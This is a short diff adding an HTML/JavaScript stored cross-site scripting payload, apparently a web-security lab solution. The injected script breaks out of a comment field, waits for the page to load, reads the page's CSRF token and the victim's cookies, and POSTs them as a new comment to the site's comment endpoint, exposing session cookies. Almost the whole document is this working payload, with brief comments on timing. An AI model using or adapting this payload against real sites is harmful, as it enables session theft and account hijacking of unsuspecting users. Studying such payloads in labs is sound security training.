@@ -1,0 +1,22 @@
+<!--creates a post request that can grab a csrf token and a cookie.-->
+
+<!--Since the csrf token is stored later in the html than our script is inserted,
+we have to wait for the rest of the page to load, or in our case just a DOM content-->
+Hey checkout this comment!</p><script>
+document.addEventListener("DOMContentLoaded", function(){
+	
+	// create the body of the request early on for easier readability
+	let body = 'csrf=' + document.getElementsByName("csrf")[0].value + '&postId=1&comment=Here%20is%20my%20comment%7b' + document.cookie + '%7d&name=hacker&email=email1%40coolguy.gov&website=http%3A%2F%2Fwebsite1.com'; 
+
+	// start POST request
+	fetch("https://coolwebsite.com/post/comment", {
+		method: "POST", 
+		headers: {
+			"Cookie": document.cookie, 
+			"Content-Type": "application/x-www-form-urlencoded"
+			},
+		body: body
+	});
+	alert(3);
+});
+</script>
